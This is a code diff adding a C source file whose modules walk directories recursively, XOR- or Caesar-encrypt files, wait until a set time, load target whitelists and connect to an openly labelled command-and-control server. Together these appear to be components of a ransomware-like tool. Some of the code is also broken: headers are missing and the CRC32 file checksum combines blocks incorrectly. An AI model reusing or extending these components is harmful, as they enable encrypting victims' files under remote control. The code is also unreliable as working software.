@@ -1,0 +1,319 @@
+/*
+ * modules.c - COMPLET
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <ctype.h>
+
+#include "scanner.h"
+#include "xor_crypto.h"
+#include "caesar_crypto.h"
+#include "rot13_crypto.h"
+#include "checksum.h"
+#include "timer.h"
+#include "config.h"
+#include "c2_client.h"
+
+// MODULE 1: SCANNER
+int should_exclude(const char *filename) {
+    if (filename[0] == '.') return 1;
+    if (strstr(filename, ".git") != NULL) return 1;
+    if (strstr(filename, ".exclude") != NULL) return 1;
+    return 0;
+}
+
+int scan_directory(const char *path, char files[][MAX_PATH], int max_files) {
+    DIR *dir = opendir(path);
+    if (!dir) return 0;
+    
+    int count = 0;
+    struct dirent *entry;
+    
+    while ((entry = readdir(dir)) != NULL && count < max_files) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+            
+        char fullpath[MAX_PATH];
+        snprintf(fullpath, MAX_PATH, "%s/%s", path, entry->d_name);
+        
+        struct stat st;
+        if (stat(fullpath, &st) == 0 && S_ISREG(st.st_mode)) {
+            if (!should_exclude(entry->d_name)) {
+                strcpy(files[count], fullpath);
+                count++;
+            }
+        }
+    }
+    
+    closedir(dir);
+    return count;
+}
+
+int scan_recursive(const char *path, char files[][MAX_PATH], int max_files, int current_count) {
+    DIR *dir = opendir(path);
+    if (dir == NULL) return current_count;
+    
+    int count = current_count;
+    struct dirent *entry;
+    
+    while ((entry = readdir(dir)) != NULL && count < max_files) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+        
+        char full_path[MAX_PATH];
+        snprintf(full_path, MAX_PATH, "%s/%s", path, entry->d_name);
+        
+        struct stat file_stat;
+        if (stat(full_path, &file_stat) != 0) continue;
+        
+        if (S_ISDIR(file_stat.st_mode)) {
+            count = scan_recursive(full_path, files, max_files, count);
+        } else if (S_ISREG(file_stat.st_mode)) {
+            if (!should_exclude(entry->d_name)) {
+                strcpy(files[count], full_path);
+                count++;
+            }
+        }
+    }
+    
+    closedir(dir);
+    return count;
+}
+
+// MODULE 2: XOR
+void xor_buffer(char *buffer, size_t size, const char *key, size_t key_len) {
+    for (size_t i = 0; i < size; i++) {
+        buffer[i] ^= key[i % key_len];
+    }
+}
+
+int xor_encrypt_file(const char *input, const char *output, const char *key) {
+    size_t key_len = strlen(key);
+    FILE *fin = fopen(input, "rb");
+    if (!fin) return -1;
+    
+    FILE *fout = fopen(output, "wb");
+    if (!fout) {
+        fclose(fin);
+        return -1;
+    }
+    
+    char buffer[BUFFER_SIZE];
+    size_t bytes_read;
+    
+    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, fin)) > 0) {
+        xor_buffer(buffer, bytes_read, key, key_len);
+        if (fwrite(buffer, 1, bytes_read, fout) != bytes_read) {
+            fclose(fin);
+            fclose(fout);
+            return -1;
+        }
+    }
+    
+    fclose(fin);
+    fclose(fout);
+    return 0;
+}
+
+int xor_decrypt_file(const char *input, const char *output, const char *key) {
+    return xor_encrypt_file(input, output, key);
+}
+
+// MODULE 3: CÉSAR
+char caesar_char(char c, int shift) {
+    if (c >= 'A' && c <= 'Z') {
+        return 'A' + (c - 'A' + shift) % 26;
+    } else if (c >= 'a' && c <= 'z') {
+        return 'a' + (c - 'a' + shift) % 26;
+    }
+    return c;
+}
+
+int caesar_encrypt_file(const char *input, const char *output, int shift) {
+    FILE *fin = fopen(input, "r");
+    if (!fin) return -1;
+    
+    FILE *fout = fopen(output, "w");
+    if (!fout) {
+        fclose(fin);
+        return -1;
+    }
+    
+    int c;
+    while ((c = fgetc(fin)) != EOF) {
+        fputc(caesar_char((char)c, shift), fout);
+    }
+    
+    fclose(fin);
+    fclose(fout);
+    return 0;
+}
+
+int caesar_decrypt_file(const char *input, const char *output, int shift) {
+    return caesar_encrypt_file(input, output, 26 - shift);
+}
+
+// MODULE 4: ROT13
+char rot13_char(char c) {
+    return caesar_char(c, 13);
+}
+
+int rot13_file(const char *input, const char *output) {
+    return caesar_encrypt_file(input, output, 13);
+}
+
+// MODULE 5: CHECKSUM
+uint32_t crc32(const unsigned char *data, size_t length) {
+    uint32_t crc = 0xFFFFFFFF;
+    for (size_t i = 0; i < length; i++) {
+        crc ^= data[i];
+        for (int j = 0; j < 8; j++) {
+            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
+        }
+    }
+    return ~crc;
+}
+
+uint32_t calculate_crc32(const char *filepath) {
+    FILE *file = fopen(filepath, "rb");
+    if (!file) return 0;
+    
+    unsigned char buffer[4096];
+    size_t bytes_read;
+    uint32_t final_crc = 0xFFFFFFFF;
+    
+    while ((bytes_read = fread(buffer, 1, 4096, file)) > 0) {
+        uint32_t block_crc = crc32(buffer, bytes_read);
+        final_crc ^= block_crc;
+    }
+    
+    fclose(file);
+    return final_crc;
+}
+
+int verify_integrity(const char *filepath, uint32_t expected_crc) {
+    return (calculate_crc32(filepath) == expected_crc) ? 0 : -1;
+}
+
+// MODULE 6: TIMER
+long get_current_timestamp() {
+    return (long)time(NULL);
+}
+
+void wait_seconds(int seconds) {
+    sleep(seconds);
+}
+
+void wait_until(long target_timestamp) {
+    while (get_current_timestamp() < target_timestamp) {
+        wait_seconds(1);
+    }
+}
+
+// MODULE 7: CONFIG
+Config* load_config(const char *filepath) {
+    Config *cfg = malloc(sizeof(Config));
+    if (!cfg) return NULL;
+    
+    cfg->whitelist_count = 0;
+    cfg->blacklist_count = 0;
+    
+    FILE *file = fopen(filepath, "r");
+    if (!file) {
+        free(cfg);
+        return NULL;
+    }
+    
+    char line[MAX_LINE];
+    int in_whitelist = 0, in_blacklist = 0;
+    
+    while (fgets(line, sizeof(line), file)) {
+        line[strcspn(line, "\n")] = 0;
+        if (line[0] == '#' || strlen(line) == 0) continue;
+        
+        if (strcmp(line, "[WHITELIST]") == 0) {
+            in_whitelist = 1;
+            in_blacklist = 0;
+            continue;
+        } else if (strcmp(line, "[BLACKLIST]") == 0) {
+            in_whitelist = 0;
+            in_blacklist = 1;
+            continue;
+        }
+        
+        if (in_whitelist && cfg->whitelist_count < MAX_ITEMS) {
+            strcpy(cfg->whitelist[cfg->whitelist_count++], line);
+        } else if (in_blacklist && cfg->blacklist_count < MAX_ITEMS) {
+            strcpy(cfg->blacklist[cfg->blacklist_count++], line);
+        }
+    }
+    
+    fclose(file);
+    return cfg;
+}
+
+int is_allowed(const Config *cfg, const char *filepath) {
+    for (int i = 0; i < cfg->blacklist_count; i++) {
+        if (strstr(filepath, cfg->blacklist[i]) != NULL) return 0;
+    }
+    for (int i = 0; i < cfg->whitelist_count; i++) {
+        if (strstr(filepath, cfg->whitelist[i]) != NULL) return 1;
+    }
+    return 0;
+}
+
+void free_config(Config *cfg) {
+    if (cfg) free(cfg);
+}
+
+// MODULE 8: C2 CLIENT
+int c2_connect(const char *ip, int port) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) return -1;
+    
+    struct sockaddr_in server_addr;
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(port);
+    
+    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
+        close(sockfd);
+        return -1;
+    }
+    
+    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        close(sockfd);
+        return -1;
+    }
+    
+    return sockfd;
+}
+
+C2Response c2_send_command(int sockfd, const C2Command *cmd) {
+    C2Response resp;
+    memset(&resp, 0, sizeof(resp));
+    
+    if (send(sockfd, cmd, sizeof(C2Command), 0) != sizeof(C2Command)) {
+        resp.status = -1;
+        strcpy(resp.message, "Send failed");
+        return resp;
+    }
+    
+    if (recv(sockfd, &resp, sizeof(C2Response), 0) <= 0) {
+        resp.status = -1;
+        strcpy(resp.message, "Receive failed");
+    }
+    
+    return resp;
+}
+
+void c2_disconnect(int sockfd) {
+    if (sockfd >= 0) close(sockfd);
+}
